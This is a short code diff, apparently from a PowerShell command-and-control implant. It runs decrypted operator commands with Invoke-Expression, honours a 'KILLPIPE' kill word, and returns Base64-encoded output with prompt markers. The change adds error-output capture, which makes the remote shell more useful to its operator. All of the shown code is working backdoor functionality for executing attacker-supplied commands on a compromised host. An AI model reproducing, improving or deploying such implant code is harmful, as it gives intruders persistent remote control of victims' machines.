@@ -101,12 +101,18 @@ try {
                            
                 if ($deccommand) {
                     try {
+                        $error.clear()
                         if ($decCommand -eq 'KILLPIPE'){exit}
                         $res = Invoke-Expression $decCommand | out-string
+                        $StdError = ($error[0] | Out-String)
+                        if ($StdError){
+                          $res = $res + $StdError
+                        }
                         if ($res -eq ""){$res = "No output from command"}
                         $res = $res + '123456PS ' + (Get-Location).Path + '>654321'
                     } catch {
                         $res = 'ErrorUpload: ' + $error[0]
+                        $res = $res + '123456PS ' + (Get-Location).Path + '>654321'
                     }
                     $fileContentBytes = [System.Text.Encoding]::Unicode.GetBytes($res)
                     $res = [System.Convert]::ToBase64String($fileContentBytes)
